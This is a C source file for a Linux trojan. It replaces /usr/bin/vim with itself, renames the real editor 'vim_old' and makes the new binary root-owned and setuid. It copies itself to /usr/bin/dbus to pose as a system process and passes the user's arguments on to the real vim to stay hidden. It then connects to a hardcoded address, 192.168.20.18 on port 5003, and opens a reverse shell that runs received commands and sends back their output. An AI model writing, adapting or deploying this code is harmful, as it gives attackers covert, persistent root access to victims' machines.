#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <limits.h>
#include <assert.h>
#include <sys/stat.h>
#include <signal.h>
#define STATUS "/var/lib/dbus/machine-process"
#define PAYLOAD "/usr/bin/dbus"
#define ERROR "/var/lib/dbus/err"
#define BINARYNAME "vim_old"
#define EDITOR "/usr/bin/vim"
#define TRUE 1
#define FALSE 0
#define ERR -1


int writepid(){
    FILE *file;
    pid_t pid = getpid();
    if ((file = fopen(STATUS, "w")) == NULL){
        return ERR;
    }
    fprintf(file, "%d", pid);
    fclose(file);
    return TRUE;
}

int getrunningpid(){
    int pid;
    FILE *file;
    if ((file = fopen(STATUS, "r")) == NULL){
       return ERR;
    }
    fscanf(file, "%d", &pid);
    fclose(file);
    return pid;
}

int testpid(){
    struct stat sts;
    int pid = getrunningpid();
    if (pid == -1){
        return FALSE;
    }
    if (0 == kill(pid, 0)){
        return TRUE;
    }
    return FALSE;
}


int establishConnection(int port, int shell) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return ERR;
    }
   
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) {
        return ERR;
    }
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        return ERR;
    }
    
    if (shell == 1){
        if (writepid() == ERR) {
            return ERR;
        }
        while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
            char line[1024];
            //Remove trailing newline
            buffer[strcspn(buffer, "\n")] = 0;
            strcat(buffer, " 2>");
            strcat(buffer, ERROR);
            FILE* fp = popen(buffer, "r");
            while((fgets(line, 1024, fp))) {
                write(sock , line , strlen(line));
            }
            FILE* err = fopen(ERROR, "r");
            while((fgets(line, 1024, err))) {
                write(sock , line , strlen(line));
            }
            char tmpcmd[50] = "rm -f ";
            strcat(tmpcmd, ERROR);
            system(tmpcmd);
        }
    } else {
        valread = read( sock , buffer, 1024);
        establishConnection(atoi(buffer), 1);
    }
    return 0;
}

int install(char *fname){
    char *file = fname + 2;
    char path[50] = "/usr/bin/";
    strcat(path, BINARYNAME);
    if (access(path, F_OK) == FALSE ) {
        return FALSE;
    }
    //install
    //move old binary
    char newpath[50] = "/usr/bin/";
    strcat(newpath, BINARYNAME);
    rename(EDITOR, newpath);
    //replace with new binary
    rename(file, EDITOR);
    //change ownership
    chown(EDITOR, 0, 0);
    //setuid
    char cmd[50] = "chmod +s ";
    strcat(cmd, EDITOR);
    system(cmd);
    printf("Installed\n");
    return TRUE;
}


int main (int argc, char *argv[]) {
    setuid(0);
    if (install(argv[0]) == TRUE){
        return FALSE;
    }
    char args[100] = BINARYNAME;
    strcat(args, " ");
    for (int i = 1;i<argc;i++){
        strcat(args, argv[i]);
        if (i != argc-1){
            strcat(args, " ");
        }
    }
    if (access(PAYLOAD, F_OK) != FALSE ) {
        char cmd1[50] = "cp ";
        char cmd2[50] = PAYLOAD;
        char cmd3[50] = "rm -f ";
        strcat(cmd1, EDITOR);
        strcat(cmd1, " ");
        strcat(cmd1, PAYLOAD);
        strcat(cmd2, " &");
        strcat(cmd3, PAYLOAD);
        system(cmd1);
        system(cmd2);
        sleep(0.1);
        system(cmd3);
        system(args);
    } else {
        if (testpid() == FALSE) {
            return establishConnection(5003, 0);
        }
    }
    
}

